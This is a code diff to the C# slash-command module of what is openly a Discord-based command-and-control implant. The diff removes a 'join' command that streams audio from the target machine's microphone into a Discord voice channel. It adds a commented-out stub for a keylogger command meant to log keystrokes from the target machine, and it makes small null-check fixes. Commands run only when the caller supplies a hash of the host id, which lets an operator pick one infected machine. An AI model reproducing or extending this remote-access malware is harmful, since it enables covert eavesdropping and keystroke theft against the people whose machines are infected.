@@ -1,11 +1,9 @@
-using Discord;
-using Discord.Audio;
 using Discord.Interactions;
 using DiscordC2.Common;
 
 public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionContext>
 {
-    public InteractionService Commands { get; set; }
+    public InteractionService? Commands { get; set; }
 
     [SlashCommand("ping", "pong")]
     public async Task Ping(string id)
@@ -39,6 +37,7 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
         if (output == null)
         {
             await FollowupAsync("error");
+            return;
         }
 
         if (output.Length > 2000-8) {
@@ -79,43 +78,14 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
             await FollowupAsync("file not found");
     }
 
-    [SlashCommand("join", "join a voice channel")] 
-    public async Task JoinChannel(string id, IVoiceChannel? channel = null)
-    {
-        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
-            return;
-        await DeferAsync();
+    // TODO
+    // [SlashCommand("log_keys", "log keystrokes from the target machine")]
+    // public async Task LogKeys(string id)
+    // {
+    //     if (id.Trim() != Utils.MD5Hash(Utils.HostId))
+    //         return;
 
-        // check if already connected
-        if (Context.Guild.CurrentUser.VoiceChannel != null) { await FollowupAsync("already connected"); return; }
-
-        // Connect to channel
-        channel ??= (Context.User as IGuildUser)?.VoiceChannel;
-        if (channel == null) { await FollowupAsync("User must be in a voice channel, or a voice channel must be passed as an argument."); return; }
-        await FollowupAsync("connected");
-
-        // Transmit Audio
-        var audioClient = await channel.ConnectAsync();
-        var stream = audioClient.CreatePCMStream(AudioApplication.Voice);
-        try 
-        {
-            Voice.GetAudioStream(stream);
-        } 
-        finally 
-        {
-            await stream.FlushAsync();
-        }
-        
-    }
-
-    [SlashCommand("leave", "leave a voice channel")] 
-    public async Task LeaveChannel()
-    {
-        await DeferAsync();
-        if (Context.Guild.CurrentUser.VoiceChannel == null) { await FollowupAsync("not in a voice channel"); return; }
-        Voice.StopAudioStream();
-        await Context.Guild.CurrentUser.VoiceChannel.DisconnectAsync();
-        await FollowupAsync("disconnected");
-    }
+    //     await DeferAsync();
+    // }
 
 }
